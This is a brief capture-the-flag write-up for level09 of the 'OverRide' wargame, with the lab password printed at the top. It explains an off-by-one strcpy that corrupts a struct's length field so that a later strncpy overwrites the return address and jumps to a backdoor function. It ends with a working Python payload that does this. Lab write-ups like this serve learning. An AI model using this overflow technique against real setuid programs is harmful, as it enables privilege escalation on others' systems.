Authenticating as level09/fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

We come across a suid binary named level09.

After analyzing the binary it seems that it has a buffer overflow where it does strcpy source to the destination with the size of 41 while the destination
is only 40bytes.

While the destination is a struct if we wrote at the 40 position we will be able to overwrite the size in the struct. in which will allow us to change the size
in here:
	strncpy(string,buffer,(long)*(int *)(string + 180));
Thus if the size is more than 200bytes, we will be able to overwrite the rip. and Execute the secret_backdoor function

level09@OverRide:~$ (python -c "print '\x90' * 40 + '\xd0\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]"; cat) | ./level09
